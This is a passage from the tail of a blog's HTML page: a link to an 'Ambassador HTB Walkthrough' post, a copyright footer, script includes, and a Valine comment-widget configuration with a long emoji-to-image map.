Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Ambassador HTB Walkthrough</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
